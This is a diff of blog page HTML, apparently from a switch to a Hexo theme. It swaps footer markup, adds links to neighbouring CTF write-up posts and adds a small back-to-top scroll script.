-      </section>
-      
-      
-        <section class="flex flex-wrap align-center">
-          <span class="gblog-footer__item">
-            Content licensed under
-            <a href="https://spdx.org/licenses/Beerware.html" class="gblog-footer__link no-wrap">Beerware license</a>
-          </span>
-        </section>
-      
+      </div>
+
+         
     </div>
     
-      <div class="flex flex-25 justify-end">
-        <span class="gblog-footer__item text-right">
-          <a class="gblog-footer__link fake-link" href="#" aria-label="Back to top">
-            <svg class="icon gblog_keyborad_arrow_up">
-              <use xlink:href="#gblog_keyborad_arrow_up"></use>
-            </svg>
-            <span class="hidden-mobile">Back to top</span>
-          </a>
-        </span>
-      </div>
+     
+  </div>
+  
     
-  </nav>
+<nav id="article-nav">
+  <a class="article-nav-btn left "
+    
+      href="/posts/cs2101/"
+      title="[HackTM finals 2023 - pwn] cs2101"
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+      
+        [HackTM finals 2023 - pwn] cs2101
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/posts/heaphop/"
+      title="[pwnme 2023 - pwn] Heap-hop"
+     >
+
+    <p class="title-text">
+      
+        [pwnme 2023 - pwn] Heap-hop
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+ 
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2023 nasm<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
 </footer>
 
     </div>
-  </body>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
+        <span class="material-symbols-rounded">keyboard_arrow_up</span>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.style.opacity = 1;
+        } else {
+            btn.style.opacity = 0;
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
 </html>
